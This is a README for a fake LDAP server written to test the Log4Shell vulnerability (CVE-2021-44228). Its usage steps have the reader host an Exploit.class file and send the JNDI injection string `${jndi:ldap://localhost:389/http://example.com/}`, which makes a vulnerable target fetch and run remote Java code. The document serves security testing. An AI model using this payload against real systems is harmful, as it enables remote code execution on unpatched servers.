# Lightweight fake ldap server for jndi lookups
This lightweight fake ldap server was initially made to test the [log4j vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2021-44228).
You can run this script to create a very lightweight fake LDAP server that will only respond with a jndi lookup payload, based on the received URL. 

## Usage
- Host a java class on the web with the name Exploit.class, in this example http://example.com/Exploit.class
- `node fakeldap.js`
- Perform jndi ldap lookup:  
`${jndi:ldap://localhost:389/http://example.com/}` - this example will load the java class from `http://example.com/Exploit.class` 